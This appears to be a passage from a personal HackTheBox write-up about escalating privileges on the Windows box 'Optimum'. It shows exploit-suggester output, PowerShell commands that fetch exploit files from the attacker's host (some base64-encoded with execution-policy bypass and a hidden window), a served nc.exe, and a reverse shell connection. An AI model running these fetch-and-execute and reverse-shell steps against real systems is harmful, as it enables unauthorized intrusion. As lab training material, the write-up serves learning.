[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*] 
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*] 
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*] 
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[*] done
```

There were a lot of possible vulns on the list again, so I took a lesson from [Granny](#15---shell-as-network-service) and googled the windows version number as well:

![](/assets/images/blogs/Pasted image 20210613122211.png)

Payloads all the things also has a good [list of kernel exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---kernel-exploitation), which seem to be the most common method on these old windows boxes so far:

![](/assets/images/blogs/Pasted image 20210613122410.png)

## Trying MS16-032

We can't use the potato exploits as we don't have either of the necessary privs, but we can look at ms16-032: [https://www.exploit-db.com/exploits/39719](https://www.exploit-db.com/exploits/39719)

As usual, there is a bit of messing about trying to find the correct one and [transfer the file](#attempting-file-transfer), but you can [skip to the final exploit](#final-exploit) if you wish.

It's also on our local box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ searchsploit ms16-032
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7 < 10 / 2008 < 2012 (x86/x64) - Local Privilege Escalation (MS16-032)                                                                               | windows/local/39809.cs
Microsoft Windows 7 < 10 / 2008 < 2012 (x86/x64) - Secondary Logon Handle Privilege Escalation (MS16-032) (Metasploit)                                                 | windows/local/40107.rb
Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)                                                               | windows/local/39719.ps1
Microsoft Windows 8.1/10 (x86) - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032)                                                 | windows_x86/local/39574.cs
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

### Attempting File Transfer

I copied it and served it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum/www]
└─$ searchsploit -m windows/local/39719.ps1
  Exploit: Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)
      URL: https://www.exploit-db.com/exploits/39719
     Path: /usr/share/exploitdb/exploits/windows/local/39719.ps1
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /home/mac/Documents/HTB/optimum/www/39719.ps1


┌──(mac㉿kali)-[~/Documents/HTB/optimum/www]
└─$ sudo python3 -m http.server 80
[sudo] password for mac: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I tried a couple of powershell commands to download the file to the box:

```cmd
powershell -command "Invoke-WebRequest http://10.10.16.211/exp.ps1 -o exp.ps1"
powershell.exe -command "Invoke-WebRequest http://10.10.16.211/exp.ps1 -o exp.ps1"
```

But neither of them got a hit.

I had a look at the python script, as it successfully executed powershell. It used this syntax:

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand
```

Where the encoded command was generated this way:

```python
encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
```

I generated this locally in an interactive python shell:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ python3 
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> command = "Invoke-WebRequest http://10.10.16.211/exp.ps1 -o exp.ps1"
>>> print(base64.b64encode(command.encode("utf-16le")).decode())
SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAyADEAMQAvAGUAeABwAC4AcABzADEAIAAtAG8AIABlAHgAcAAuAHAAcwAxAA==
```

Which means our command should be:

```cmd
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAyADEAMQAvAGUAeABwAC4AcABzADEAIAAtAG8AIABlAHgAcAAuAHAAcwAxAA==
```

But this also didn't work to download our exploit.

I thought maybe I needed the full path, so went hunting on google: [https://stackoverflow.com/questions/4145232/path-to-powershell-exe-v-2-0](https://stackoverflow.com/questions/4145232/path-to-powershell-exe-v-2-0)

```cmd
PS C:\Windows\System32\WindowsPowershell> dir


    Directory: C:\Windows\System32\WindowsPowershell


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
d---s        22/11/2014   7:06 ??            v1.0                                                                      


PS C:\Windows\System32\WindowsPowershell> cd v1.0
PS C:\Windows\System32\WindowsPowershell\v1.0> dir


    Directory: C:\Windows\System32\WindowsPowershell\v1.0


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
...[snip]...

-a---        22/11/2014   3:46 ??     460288 powershell.exe                                                            
...[snip]...    
```

I tried again, but still got nothing:

```cmd
PS C:\Users\kostas\Documents> C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -command "Invoke-WebRequest http://10.10.16.211/39719.ps1 -o exp.ps1"
```

And tried with the encoded command:

```cmd
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgAyADEAMQAvAGUAeABwAC4AcABzADEAIAAtAG8AIABlAHgAcAAuAHAAcwAxAA==
```

But no download.

So, I tried `wget`. To my surprise, it worked:

```cmd
PS C:\Users\kostas\Desktop> wget http://10.10.16.211/39719.ps1


StatusCode        : 200
StatusDescription : OK
Content           : {102, 117, 110, 99...}
RawContent        : HTTP/1.0 200 OK
                    Content-Length: 11829
                    Content-Type: application/octet-stream
                    Date: Sun, 13 Jun 2021 11:40:39 GMT
                    Last-Modified: Sun, 13 Jun 2021 11:26:50 GMT
                    Server: SimpleHTTP/0.6 Python/3.9.2
                    ...
Headers           : {[Content-Length, 11829], [Content-Type, application/octet-stream], [Date, Sun, 13 Jun 2021 11:40:3
                    9 GMT], [Last-Modified, Sun, 13 Jun 2021 11:26:50 GMT]...}
RawContentLength  : 11829

```

I tried to run it:

```cmd
PS C:\Users\kostas\Desktop> C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -noexit "& ""C:\Users\kostas\Desktop\39719.ps1"""
```

This just hung. I re-read the exploit, and it said it only supported powershell 2.0.

However, I noticed I seemed to be *in* a powershell shell (denoted by the `PS` shell prompt). I tested this:

```cmd
PS C:\Users\kostas\Desktop> Invoke-WebRequest http://10.10.16.211/test
```

And suddenly it worked!

![](/assets/images/blogs/Pasted image 20210613124656.png)

I guess trying to run powershell.exe inside a powershell prompt was messing things up

### Trying the Exploit

Trying to run the script within this prompt didn't hang, but it didn't escalate our privileges either:

```cmd
PS C:\Users\kostas\Desktop> 39719.ps1
PS C:\Users\kostas\Desktop> .\39719.ps1
PS C:\Users\kostas\Desktop> whoami
optimum\kostas
```

I tried the next one in the list: [https://www.exploit-db.com/exploits/41020/](https://www.exploit-db.com/exploits/41020/), which actually had a precompiled binary: [https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe)

I got it downloaded to the box, but it wouldn't execute:

```cmd
PS C:\Users\kostas\Desktop> Invoke-WebRequest http://10.10.16.211/exp.exe -Outfile exp.exe
PS C:\Users\kostas\Desktop> dir


    Directory: C:\Users\kostas\Desktop


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---         20/6/2021  12:20 ??     560128 exp.exe                                                                   
-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
-ar--         18/3/2017   2:13 ??         32 user.txt.txt                                                              


PS C:\Users\kostas\Desktop> exp.exe
PS C:\Users\kostas\Desktop> C:\Users\kostas\Desktop\exp.exe
whoami
^C
```

I tried again with a fresh shell:

```cmd
listening on [any] 413 ...
connect to [10.10.16.211] from (UNKNOWN) [10.10.10.8] 49184
whoami
optimum\kostas
PS C:\Users\kostas\Desktop> & "C:\Users\kostas\Desktop\exp.exe"
````

But no luck.

## Getting a Better Shell

I tried fixing the shell I couldn't get working earlier. I copied across an `nc.exe` binary and hosted it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum/www]
└─$ locate nc.exe
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
┌──(mac㉿kali)-[~/Documents/HTB/optimum/www]
└─$ cp /usr/share/windows-resources/binaries/nc.exe .
┌──(mac㉿kali)-[~/Documents/HTB/optimum/www]
└─$ sudo python3 -m http.server 80
[sudo] password for mac: 
Sorry, try again.
[sudo] password for mac: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I ran the exploit again:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/optimum]
└─$ python2 39161.py 10.10.10.8 80
```

And after 30 seconds or so I got a hit!

![](/assets/images/blogs/Pasted image 20210613135029.png)

## Final Exploit

Now I had to try and run my exploit again. Just `exp.exe` didn't work, but specifying the full path did:

![](/assets/images/blogs/Pasted image 20210613135104.png)

That's the box!

![](/assets/images/blogs/Pasted image 20210613134757.png)

# Key Lessons
Here are some of the key things I learned from this box:
- Try every tool! There may be multiple exploits available - go for the most recent one first, and don't give up if one doesn't work
- You can use `wget` as an alternative download method when powershell is being fiddly
- Bear in mind what *kind* of shell you're in - it may be powershell, not command prompt, which will change the syntax of the commands you're running